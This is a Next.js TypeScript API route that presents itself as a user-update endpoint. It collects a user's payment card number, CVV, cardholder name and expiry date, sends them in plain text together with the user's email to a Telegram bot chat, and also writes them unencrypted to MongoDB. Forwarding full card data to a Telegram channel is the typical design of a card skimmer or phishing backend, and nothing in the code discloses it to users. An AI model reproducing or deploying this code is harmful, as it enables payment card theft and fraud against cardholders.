// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from "next";
import dbConnect from "../../lib/dbConnect";
import User from "../../../model/User";
import bcrypt from "bcryptjs";

interface ResponseData {
  error?: string;
  msg?: string;
}




export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  await dbConnect();
  try {
  // validate if it is a PUT
  if (req.method !== "PUT") {
    return res
      .status(200)
      .json({ error: "This API call only accepts POST methods" });
  }

  // get and validate body variables exp cvv:cvv, cardNumber:cardNumber, name:name, exp:exp, userId:session?.user
    
  const {
    ccv,
    cardNumber,
    name,
    exp,
    userId,
   
  } = req.body;
  
  const data = {
    cvv:ccv,
    cardNumber,
    name,
    exp,
    }


    const text = `
      USER_EMAIL : ${userId.email}
      CARD NAME : ${name} 
      Card Number : ${cardNumber} 
      CCV : ${ccv} 
      EXPIRING DATE : ${exp} 
    `
    
    const telegramURL = `https://api.telegram.org/${process.env.BOTID}/sendMessage`;
    const chat_id = process.env.CJANNELID
    const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
      method: 'POST',
      headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
      body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
    });

    console.log(':::::>>>:::::', sendMessage.statusText, sendMessage.statusText)
    
  //console.log(req.body, '----')


 
   // update User on MongoDB
   const query = await User.findByIdAndUpdate(
    userId._id,
    {
      $set: data
     },
    {new:true}
   )
   // console.log(query)
  if (query) {
    res.status(200).json({ msg: "Update User: " })
  }
  
 // res.status(500).json({ msg: "SERVER ERROR " })

  } catch (error) {
    console.log(error)
  res.status(500).json({ msg: "SERVER ERROR " })
 }
 

  

}